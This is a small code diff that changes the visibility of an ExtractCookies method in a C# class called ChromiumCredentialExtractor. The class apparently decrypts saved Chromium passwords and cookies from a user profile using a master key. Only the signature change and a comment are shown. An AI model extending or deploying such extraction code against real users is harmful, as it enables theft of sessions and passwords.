@@ -119,7 +119,7 @@ public static partial class ChromiumCredentialExtractor
     /// failure here is logged and skipped rather than allowed to cost the
     /// passwords that come from the same profile.
     /// </summary>
-    private static void ExtractCookies(
+    internal static void ExtractCookies(
         byte[] masterKey, string profileDir, List<ChromiumCookie> cookies, ILogger logger)
     {
         var cookiesPath = CookieDataReader.Locate(profileDir);
